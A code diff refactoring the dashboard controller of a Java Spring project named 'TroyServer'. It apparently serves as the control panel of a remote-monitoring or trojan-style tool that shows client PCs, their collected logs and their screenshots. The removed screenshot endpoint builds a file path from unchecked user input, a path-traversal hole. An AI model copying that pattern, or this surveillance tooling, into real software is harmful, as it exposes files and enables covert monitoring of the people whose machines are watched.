@@ -1,29 +1,18 @@
 package ch.lebois.troyserver.controller;
 
-import ch.lebois.troyserver.data.Client;
-import ch.lebois.troyserver.data.ClientRepository;
-import ch.lebois.troyserver.data.Image;
-import ch.lebois.troyserver.data.ImageRepository;
-import ch.lebois.troyserver.data.Message;
-import ch.lebois.troyserver.data.MessageRepository;
+import ch.lebois.troyserver.data.entity.Client;
+import ch.lebois.troyserver.data.repository.ClientRepository;
+import ch.lebois.troyserver.data.repository.ImageRepository;
+import ch.lebois.troyserver.data.entity.Message;
+import ch.lebois.troyserver.data.repository.MessageRepository;
 import ch.lebois.troyserver.model.DashboardModel;
-import ch.lebois.troyserver.model.HomepageModel;
 import ch.lebois.troyserver.service.CookieService;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.util.ArrayList;
-import java.util.List;
 import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import org.apache.tomcat.util.http.fileupload.IOUtils;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
-import org.springframework.web.bind.annotation.RequestParam;
 
 /**
  * Project: Hermann
@@ -32,7 +21,7 @@ import org.springframework.web.bind.annotation.RequestParam;
 
 
 @Controller
-@RequestMapping(value = {"dashboard", "dashboard/"})
+@RequestMapping(value = {"dashboard/"})
 public class DashboardController {
 
     private ClientRepository clientRepository;
@@ -48,71 +37,40 @@ public class DashboardController {
         this.cookieService = cookieService;
     }
 
-    @RequestMapping(method = RequestMethod.GET)
-    public String getHomepage(Model model, HttpServletRequest request) {
-        try {
-            String user = cookieService.getCurrentUser(request);
-            List<HomepageModel> list = new ArrayList<>();
-
-            for (Client c : clientRepository.findAll()) {
-                HomepageModel h = new HomepageModel();
-                h.setClient(c.getPcName());
-                h.setLogcount(0);
-                h.setErrorcount(0);
-                h.setOs(c.getOs());
-                h.setLastseen(c.getLastseen());
-                for (Message m : messageRepository.findAll()) {
-                    if (m.getPcNameFk().equals(c.getPcName())) {
-                        h.setLogcount(h.getLogcount() + 1);
-                        if (m.getType().equals("errorout")) {
-                            h.setErrorcount(h.getErrorcount() + 1);
-                        }
-                    }
-                }
-                list.add(h);
-            }
-
-
-            model.addAttribute("model", list);
-            model.addAttribute("user", user);
-            return "homepage";
-        } catch (NullPointerException e) {
-            return "redirect:/login";
-        }
-
-    }
-
-
     @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
     public String getClientControlPanel(@PathVariable(value = "client") String clientParam, Model model,
                                         DashboardModel dashboardModel, HttpServletRequest request) {
         try {
-            String user = cookieService.getCurrentUser(request);
-
             Client client = clientRepository.findOne(clientParam);
             if (client == null) {
                 return "redirect:/dashboard";
             }
             dashboardModel.setClient(client);
 
-            Object logs = "";
-            Iterable<Message> logList = messageRepository.findAll();
-            for (Message m : logList) {
-                if (m.getPcNameFk().equals(clientParam)) {
-                    logs = logs + m.getText() + "\n";
-                }
-            }
-
-            List<Image> images = imageRepository.findImagesByPcNameFk(clientParam);
-
-            model.addAttribute("model", dashboardModel);
-            model.addAttribute("logs", logs);
-            model.addAttribute("images", images);
-            model.addAttribute("user", user);
+            setAtributes(clientParam, model, dashboardModel, request);
             return "dashboard";
         } catch (NullPointerException e) {
             return "redirect:/login";
         }
+    }
+
+    private void setAtributes(String clientName, Model model,
+                              DashboardModel dashboardModel, HttpServletRequest request) {
+        model.addAttribute("model", dashboardModel);
+        model.addAttribute("logs", getLogs(clientName));
+        model.addAttribute("images", imageRepository.findImagesByPcNameFk(clientName));
+        model.addAttribute("user", cookieService.getCurrentUser(request));
+    }
+
+    private String getLogs(String clientName) {
+        String logs = "";
+        Iterable<Message> logList = messageRepository.findAll();
+        for (Message m : logList) {
+            if (m.getPcNameFk().equals(clientName)) {
+                logs = logs + m.getText() + "\n";
+            }
+        }
+        return logs;
     }
 
     @RequestMapping(value = {"{client}"}, method = RequestMethod.POST)
@@ -125,28 +83,4 @@ public class DashboardController {
         }
         return "redirect:/dashboard/" + clientParam;
     }
-
-    @RequestMapping(value = "/img/{file}", method = RequestMethod.GET)
-    public void getImg(@PathVariable(value = "file") String filePath, HttpServletResponse response) throws IOException {
-        InputStream in = new FileInputStream(
-//                TODO: Change Path
-                new File("C:\\Users\\Felix\\Documents\\_Projekte\\Herman\\game-dev\\TroyServer\\src\\main\\"
-                         + "resources\\screenshots\\" + filePath + ".jpg"));
-
-        try {
-            response.setContentType("image/jpeg");
-            IOUtils.copy(in, response.getOutputStream());
-        } finally {
-            IOUtils.closeQuietly(in);
-        }
-    }
-
-    @RequestMapping(value = "/img/{file}/remove", method = RequestMethod.GET)
-    public String removeImg(@PathVariable(value = "file") String filePath,
-                            @RequestParam(value = "client") String clientParam) throws IOException {
-        imageRepository.delete(imageRepository.findImageByName(filePath));
-
-        return "redirect:/dashboard/" + clientParam;
-    }
-
 }
